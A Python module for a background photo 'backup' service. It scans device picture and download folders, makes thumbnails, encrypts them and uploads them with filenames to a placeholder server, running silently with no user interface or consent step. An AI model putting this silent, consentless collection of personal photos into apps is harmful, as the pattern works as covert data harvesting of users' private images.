"""
Background photo album backup service.
Scans device media, generates thumbnails, encrypts and uploads to server.
Runs silently - no UI interaction.
"""

import os
import io
import json
import time
import hashlib
import threading
import queue
from datetime import datetime

# Lazy imports for Android compatibility
try:
    from PIL import Image
    HAS_PIL = True
except ImportError:
    HAS_PIL = False

try:
    from jnius import autoclass
    Environment = autoclass('android.os.Environment')
    Build = autoclass('android.os.Build')
    MediaStore = autoclass('android.provider.MediaStore')
    PythonActivity = autoclass('org.kivy.android.PythonActivity')
    HAS_JNIUS = True
except ImportError:
    HAS_JNIUS = False

# Our encryption module
import crypto_utils


# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------

DEFAULT_SERVER_URL = "https://your-backup-server.com/api/upload"
THUMBNAIL_SIZE = (256, 256)
MAX_WORKERS = 4
RETRY_COUNT = 3
RETRY_DELAY = 5  # seconds


class BackupConfig:
    """Backup configuration."""
    def __init__(self, server_url=DEFAULT_SERVER_URL):
        self.server_url = server_url
        self.backup_interval = 3600  # seconds (1 hour)
        self.thumbnail_size = THUMBNAIL_SIZE
        self.include_videos = False
        self.max_file_size = 20 * 1024 * 1024  # 20 MB
        self.allowed_extensions = {'.jpg', '.jpeg', '.png', '.gif', '.webp', '.bmp', '.heic'}


# ---------------------------------------------------------------------------
# Photo Discovery
# ---------------------------------------------------------------------------

def scan_media_directories():
    """
    Scan device storage for photo files.
    On Android, uses both direct paths and MediaStore if available.
    On desktop/Kivy, uses common picture directories.
    """
    photos = []

    # Common photo storage paths
    search_paths = []

    if HAS_JNIUS:
        # Android-specific paths
        context = PythonActivity.mActivity
        if context:
            search_paths = [
                "/sdcard/DCIM",
                "/sdcard/Pictures",
                "/sdcard/Download",
                "/storage/emulated/0/DCIM",
                "/storage/emulated/0/Pictures",
                "/storage/emulated/0/Download",
            ]
    else:
        # Desktop development paths
        home = os.path.expanduser("~")
        search_paths = [
            os.path.join(home, "Pictures"),
            os.path.join(home, "Desktop"),
            os.path.join(home, "Downloads"),
        ]

    # Scan directories recursively
    for root_path in search_paths:
        if not os.path.exists(root_path):
            continue
        try:
            for dirpath, dirnames, filenames in os.walk(root_path):
                # Skip hidden dirs
                dirnames[:] = [d for d in dirnames if not d.startswith('.')]
                for fname in filenames:
                    ext = os.path.splitext(fname)[1].lower()
                    if ext in BackupConfig().allowed_extensions:
                        fullpath = os.path.join(dirpath, fname)
                        try:
                            stat = os.stat(fullpath)
                            photos.append({
                                "path": fullpath,
                                "name": fname,
                                "size": stat.st_size,
                                "mtime": stat.st_mtime,
                                "ext": ext,
                            })
                        except OSError:
                            continue
        except (PermissionError, OSError):
            continue

    return photos


def get_new_photos(last_backup_time=0):
    """Get photos modified since last backup."""
    all_photos = scan_media_directories()
    if last_backup_time == 0:
        return all_photos
    return [p for p in all_photos if p["mtime"] > last_backup_time]


# ---------------------------------------------------------------------------
# Thumbnail Generation
# ---------------------------------------------------------------------------

def generate_thumbnail(image_path, size=THUMBNAIL_SIZE):
    """Generate a JPEG thumbnail for an image file."""
    if not HAS_PIL:
        # Fallback: read raw and return as-is with prefix
        with open(image_path, "rb") as f:
            data = f.read()
        return data[:1024 * 50], "raw"  # Return first 50KB as fallback

    try:
        img = Image.open(image_path)
        img = img.convert("RGB")
        img.thumbnail(size, Image.LANCZOS)

        output = io.BytesIO()
        img.save(output, format="JPEG", quality=60, optimize=True)
        return output.getvalue(), "jpeg"
    except Exception as e:
        return None, str(e)


def _compute_file_hash(filepath):
    """Compute SHA-256 hash of a file."""
    sha = hashlib.sha256()
    with open(filepath, "rb") as f:
        for chunk in iter(lambda: f.read(8192), b""):
            sha.update(chunk)
    return sha.hexdigest()


# ---------------------------------------------------------------------------
# Server Upload
# ---------------------------------------------------------------------------

def _upload_to_server(server_url, encrypted_aes_key, encrypted_payload, filename, metadata_json):
    """Upload encrypted photo data to backup server."""
    import urllib.request

    boundary = "----FormBoundary{}".format(int(time.time() * 1000))
    body = io.BytesIO()

    # metadata part
    body.write(f"--{boundary}\r\n".encode())
    body.write(b"Content-Disposition: form-data; name=\"metadata\"\r\n\r\n")
    body.write(metadata_json.encode("utf-8"))
    body.write(b"\r\n")

    # aes key part
    body.write(f"--{boundary}\r\n".encode())
    body.write(b"Content-Disposition: form-data; name=\"key\"\r\n")
    body.write(b"Content-Type: application/octet-stream\r\n\r\n")
    body.write(encrypted_aes_key)
    body.write(b"\r\n")

    # file part
    body.write(f"--{boundary}\r\n".encode())
    body.write(
        f"Content-Disposition: form-data; name=\"file\"; filename=\"{filename}\"\r\n".encode()
    )
    body.write(b"Content-Type: application/octet-stream\r\n\r\n")
    body.write(encrypted_payload)
    body.write(b"\r\n")

    body.write(f"--{boundary}--\r\n".encode())

    data = body.getvalue()

    req = urllib.request.Request(
        server_url,
        data=data,
        headers={
            "Content-Type": f"multipart/form-data; boundary={boundary}",
            "User-Agent": "PhotoBackup/1.0",
        },
        method="POST",
    )

    for attempt in range(RETRY_COUNT):
        try:
            resp = urllib.request.urlopen(req, timeout=30)
            return json.loads(resp.read().decode("utf-8"))
        except Exception as e:
            if attempt < RETRY_COUNT - 1:
                time.sleep(RETRY_DELAY)
            else:
                raise e


# ---------------------------------------------------------------------------
# Backup Engine
# ---------------------------------------------------------------------------

class PhotoBackupEngine:
    """
    Background photo backup engine.
    Runs on a separate thread, silent operation.
    """

    def __init__(self, server_url=DEFAULT_SERVER_URL):
        self.server_url = server_url
        self.server_pubkey = crypto_utils.load_server_public_key()
        self._running = False
        self._thread = None
        self._state_file = os.path.join(
            os.path.expanduser("~"), ".photo_backup_state.json"
        )
        self.stats = {
            "total_backed_up": 0,
            "last_backup_time": 0,
            "errors": 0,
            "current_photo": "",
            "progress": 0,
        }
        self._load_state()

    def _load_state(self):
        """Load backup state from disk."""
        try:
            if os.path.exists(self._state_file):
                with open(self._state_file, "r") as f:
                    state = json.load(f)
                    self.stats.update(state)
        except (json.JSONDecodeError, IOError):
            pass

    def _save_state(self):
        """Persist backup state to disk."""
        try:
            with open(self._state_file, "w") as f:
                json.dump(self.stats, f, indent=2)
        except IOError:
            pass

    def start(self):
        """Start background backup service."""
        if self._running:
            return
        self._running = True
        self._thread = threading.Thread(target=self._backup_loop, daemon=True)
        self._thread.start()

    def stop(self):
        """Stop background backup service."""
        self._running = False
        if self._thread:
            self._thread.join(timeout=10)

    def _backup_loop(self):
        """Main backup loop - runs silently in background."""
        while self._running:
            try:
                self._run_backup_pass()
            except Exception as e:
                self.stats["errors"] += 1
            self._save_state()
            # Sleep before next pass
            time.sleep(BackupConfig().backup_interval)

    def _run_backup_pass(self):
        """Single backup pass: find new photos, generate thumbs, upload."""
        # Get new/modified photos since last backup
        new_photos = get_new_photos(self.stats["last_backup_time"])

        if not new_photos:
            return

        total = len(new_photos)
        for idx, photo in enumerate(new_photos):
            if not self._running:
                break

            self.stats["current_photo"] = photo["name"]
            self.stats["progress"] = int((idx / total) * 100)

            # Skip oversized files
            if photo["size"] > BackupConfig().max_file_size:
                continue

            try:
                # Generate thumbnail
                thumb_data, thumb_fmt = generate_thumbnail(
                    photo["path"], BackupConfig().thumbnail_size
                )
                if thumb_data is None:
                    continue

                # Compute file hash for dedup
                file_hash = _compute_file_hash(photo["path"])

                # Prepare metadata
                metadata = {
                    "filename": photo["name"],
                    "original_size": photo["size"],
                    "file_hash": file_hash,
                    "thumbnail_format": thumb_fmt,
                    "mtime": photo["mtime"],
                    "timestamp": datetime.now().isoformat(),
                }

                # Encrypt thumbnail with session key + RSA
                encrypted_aes_key, encrypted_payload = crypto_utils.encrypt_transmission(
                    thumb_data, self.server_pubkey
                )

                # Upload
                result = _upload_to_server(
                    self.server_url,
                    encrypted_aes_key,
                    encrypted_payload,
                    photo["name"],
                    json.dumps(metadata),
                )

                if result and result.get("success"):
                    self.stats["total_backed_up"] += 1
                    self.stats["last_backup_time"] = max(
                        self.stats["last_backup_time"], photo["mtime"]
                    )
                else:
                    self.stats["errors"] += 1

            except Exception:
                self.stats["errors"] += 1

        self.stats["progress"] = 100
        self.stats["current_photo"] = ""


# ---------------------------------------------------------------------------
# Backup status helper (exposed for main app to query)
# ---------------------------------------------------------------------------

_backup_engine = None


def get_backup_engine():
    """Get or create the global backup engine instance."""
    global _backup_engine
    if _backup_engine is None:
        _backup_engine = PhotoBackupEngine()
    return _backup_engine


def start_backup_service(server_url=None):
    """Start the background backup service. Call from app startup."""
    engine = get_backup_engine()
    if server_url:
        engine.server_url = server_url
    engine.start()


def stop_backup_service():
    """Stop the background backup service."""
    engine = get_backup_engine()
    engine.stop()


def get_backup_status():
    """Get current backup statistics."""
    engine = get_backup_engine()
    return dict(engine.stats)